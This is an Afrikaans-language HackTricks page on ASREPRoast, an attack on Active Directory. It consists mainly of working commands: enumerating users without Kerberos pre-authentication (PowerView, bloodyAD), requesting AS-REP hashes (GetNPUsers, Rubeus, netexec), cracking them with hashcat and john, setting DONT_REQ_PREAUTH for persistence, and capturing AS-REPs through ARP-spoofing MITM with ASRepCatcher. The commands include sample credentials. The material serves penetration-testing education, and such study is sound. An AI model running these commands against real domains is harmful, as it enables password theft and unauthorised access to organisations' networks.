# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast is 'n sekuriteitsaanval wat gebruikers uitbuit wat nie die **Kerberos pre-authentication required attribute** het nie. In wese laat hierdie kwesbaarheid aanvallers toe om verifikasie vir 'n gebruiker by die Domain Controller (DC) aan te vra sonder om die gebruiker se wagwoord te benodig. Die DC reageer dan met 'n boodskap wat versleuteld is met die gebruiker se wagwoord-afgeleide sleutel, wat aanvallers offline kan probeer kraak om die gebruiker se wagwoord te ontdek.

Die hoofvereistes vir hierdie aanval is:

- **Lack of Kerberos pre-authentication**: Teikengebruikers mag hierdie sekuriteitsfunksie nie aangeskakel hê nie.
- **Connection to the Domain Controller (DC)**: Aanvallers het toegang tot die DC nodig om versoeke te stuur en versleutelde boodskappe te ontvang.
- **Optional domain account**: Om 'n domain account te hê stel aanvallers in staat om meer doeltreffend kwesbare gebruikers te identifiseer deur LDAP queries. Sonder so 'n rekening moet aanvallers gebruikersname raai.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Versoek AS_REP boodskap
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus sal 'n 4768 genereer met 'n encryption type van 0x17 en preauth type van 0.

#### Kort eenreëls (Linux)

- Eerstens, enumereer potensiële teikens (bv. vanaf leaked build paths) met Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Haal 'n enkele gebruiker se AS-REP selfs met 'n **blank** wagwoord deur `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` te gebruik (netexec druk ook LDAP signing/channel binding posture).
- Kraak met `hashcat out.asreproast /path/rockyou.txt` – dit herken outomaties **-m 18200** (etype 23) vir AS-REP roast hashes.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistensie

Om **preauth** af te dwing is nie nodig vir 'n gebruiker waarvoor jy **GenericAll**-regte het (of regte om eienskappe te skryf):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast without credentials

’n aanvaller kan ’n man-in-the-middle-posisie gebruik om AS-REP-pakkette vas te vang terwyl hulle deur die netwerk beweeg, sonder om op Kerberos pre-authentication staat te maak. Dit werk dus vir alle gebruikers op die VLAN.\  
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) stel ons in staat om dit te doen. Boonop dwing die hulpmiddel kliënt-werkstasies om RC4 te gebruik deur die Kerberos-onderhandeling te verander.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Verwysings

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
